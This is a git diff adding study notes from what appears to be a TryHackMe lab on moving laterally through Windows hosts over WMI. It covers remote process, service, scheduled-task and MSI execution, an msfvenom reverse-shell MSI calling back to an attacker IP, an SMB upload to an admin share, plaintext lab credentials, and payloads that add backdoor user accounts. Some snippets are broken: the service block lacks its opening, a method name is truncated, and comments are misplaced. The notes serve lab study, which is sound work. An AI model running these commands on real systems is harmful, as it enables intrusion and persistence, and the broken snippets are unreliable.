@@ -397,3 +397,87 @@ Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami
   - schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<command/payload to execute>" /sc ONCE /sd 01/01/1970 /st 00:00 
   - schtasks /s TARGET /run /TN "THMtask1" 
   - schtasks /S TARGET /TN "THMtask1" /DELETE /F
+
+## WMI
+- Windows Management Instrumentation
+  - Web based
+  - Create PSCredential object:
+
+```
+$username = 'Administrator';
+$password = 'Mypass123';
+$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+```
+
+- WMI Sessiont
+```
+$Opt = New-CimSessionOption -Protocol DCOM
+$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
+```
+
+- Remote Process
+  - 135/TCP, 49152-65535/TCP (DCERPC)
+  - 5985/TCP (WinRM HTTP) or 5986/TCP (WinRM HTTPS)
+  - Group: Administrators
+```
+$Command = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere";
+
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
+CommandLine = $Command
+}
+```
+
+- Create services remotly
+```
+Name = "THMService2";
+DisplayName = "THMService2";
+PathName = "net user munra2 Pass123 /add"; # Your payload
+ServiceType = [byte]::Parse("16"); # Win32OwnProcess : Start service in a new process
+StartMode = "Manual"
+}
+
+# Create
+$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
+
+Invoke-CimMethod -InputObject $Service -MethodName StartServic
+
+# handle
+Invoke-CimMethod -InputObject $Service -MethodName StopService
+Invoke-CimMethod -InputObject $Service -MethodName Delete
+```
+
+- Scheduled Task
+```
+# Payload must be split in Command and Args
+$Command = "cmd.exe"
+$Args = "/c net user munra22 aSdf1234 /add"
+
+$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
+Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
+Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+
+
+# Execute
+Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
+```
+
+- Installing MSI package
+```
+Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
+```
+
+- Steps
+  - create reverse shell: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.50.65.3 LPORT=4445 -f msi > myinstaller.msi  
+  - send file: smbclient -c 'put myinstaller.msi' -U USERNAME -W ZA '//thmiis.za.tryhackme.com/admin$/' PASSWORD
+- 
+```
+PS C:\> $username = 't1_corine.waters';
+PS C:\> $password = 'Korine.1994';
+PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
+PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
+PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
+PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
+
+```
+
